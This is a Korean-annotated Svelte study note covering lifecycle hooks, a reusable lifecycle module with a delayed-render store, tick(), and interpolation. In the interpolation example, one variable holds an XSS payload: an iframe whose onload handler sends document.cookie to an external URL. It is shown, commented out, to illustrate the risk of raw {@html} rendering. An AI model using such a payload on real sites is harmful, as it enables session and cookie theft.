## Basic

- lifecylcle
  - lifecycle.svelte
    ```jsx
    <script>
      import { afterUpdate, beforeUpdate, onDestroy, onMount } from "svelte";

      let name = "life cycle...";
      let h1;
      function addDot() {
        name += ".";
      }

      ////////////////////////////////////////////////////////////////////////
      onMount(() => {
        console.log("Mounted");
        h1 = document.querySelector("h1");
        // return을 통해서도 onDestroy 가능
        return () => {
          console.log("destoried!");
        };
      });

      onDestroy(() => {
        console.log("Before destoried");
        // Destory 이전에 실행되기 떄문에 component를 읽을 수 있음
        h1 = document.querySelector("h1");
      });

      beforeUpdate(() => {
        console.log("Before update!");
        console.log(h1 && h1.innerText);
      });

      afterUpdate(() => {
        console.log("After update!");
        console.log(h1.innerText);
      });
    </script>

    <h1 on:click="{addDot}">{name}</h1>
    ```
  - lifecycle.js
    - 라이프사이클 모듈화해서 사용
    ```jsx
    import { afterUpdate, beforeUpdate, onDestroy, onMount } from 'svelte';
    import { writable } from 'svelte/store';

    export function lifecycle() {
      onMount(() => {
        console.log('onMount!');
      });

      onDestroy(() => {
        console.log('onDestroy!');
      });

      beforeUpdate(() => {
        console.log('beforeUpdate!');
      });

      afterUpdate(() => {
        console.log('afterUpdate!');
      });
    }

    export function delayRender(delay = 3000) {
      let render = writable(false);
      onMount(() => {
        setTimeout(() => {
          // $render = true; svelte 파일이 아니기때문에 $ 사용이 안됨
          render.set(true);
        }, delay);
      });
      return render; // 값이 아닌 store 객체
    }
    ```
  - tick()
    ```jsx
    <script>
      import { tick } from 'svelte';

      let name = 'world';

      async function handler() {
        name = 'jw';
        await tick(); // 화면이 갱신될때까지 기다려주는 함수. Promise를 반환
        const h1 = document.querySelector('h1');
        console.log(h1.innerText);
      }
    </script>

    <h1 on:click={handler}>hello {name}!</h1>
    ```
- 보간법
  ```jsx
  <script>
    let href = 'https://github.com/Jinwook-Song/svelte-basic';
    let name = 'jinwook';
    let value = 'new input value';
    let isUppercase = false;

    let h1 = '<h1>원시 HTML</h1>';
    let xss =
      '<iframe onload="document.location=`https://github.com/Jinwook-Song/svelte-basic?${document.cookie}`"></iframe>';

    let index = 0;
  </script>

  <a {href}>{name}</a>

  <!-- 보간법 -->
  <input {value} on:input={(e) => (value = e.target.value)} />
  <input bind:value />

  <div>{isUppercase ? 'DIV' : 'div'}</div>

  <!-- 원시 HTML -->
  {@html h1}
  <!-- {@html xss} -->

  <!-- 데이터 디버깅 -->
  {@debug index}
  <h1 on:click={() => (index += 1)}>Hello {name}</h1>
  ```
